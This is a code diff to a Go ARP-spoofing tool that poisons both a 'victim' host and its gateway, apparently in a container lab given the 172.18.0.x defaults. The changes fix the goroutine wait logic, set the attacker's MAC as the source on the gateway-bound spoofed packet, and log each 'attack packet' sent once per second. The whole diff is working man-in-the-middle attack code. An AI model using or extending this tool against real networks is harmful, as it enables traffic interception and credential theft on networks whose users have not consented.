@@ -3,6 +3,7 @@ package main
 import (
 	"flag"
 	"fmt"
+	"log"
 	"net"
 	"os"
 	"sync"
@@ -24,7 +25,6 @@ var (
 func main() {
 	wg := sync.WaitGroup{}
 
-	wg.Add(1)
 	targetPtr := flag.String("targ", "172.18.0.3", "The ip of victim")
 	targetMAC := flag.String("targm", "FF:FF:FF:FF:FF:FF", "The mac of victim.")
 	gatewayPtr := flag.String("gw", "172.18.0.1", "ip of gateway")
@@ -51,6 +51,7 @@ func main() {
 	ipAddr, _, err = net.ParseCIDR(addrs[0].String())
 	target = *targetPtr
 
+	wg.Add(1)
 	go arpPoison(*targetMAC, *gatewayPtr, *gatewayMAC)
 	defer handle.Close()
 	wg.Wait()
@@ -80,14 +81,18 @@ func arpPoison(targetMAC, gateway, gatewayMAC string) {
 	arpPacket.DstProtAddress = tg
 
 	gwEthernetPacket := ethernetPacket
+	gwEthernetPacket.DstMAC = gwm
+	gwEthernetPacket.SrcMAC = macAddr
 	gwARPPacket := arpPacket
 
+	gwARPPacket.SourceHwAddress = macAddr
 	gwARPPacket.SourceProtAddress = tg
 	gwARPPacket.DstHwAddress = gwm
 	gwARPPacket.DstProtAddress = gw
 	ticker := time.NewTicker(time.Second)
 
 	for range ticker.C {
+		log.Printf("send attack packet")
 		writePoison(arpPacket, ethernetPacket)
 		writePoison(gwARPPacket, gwEthernetPacket)
 	}
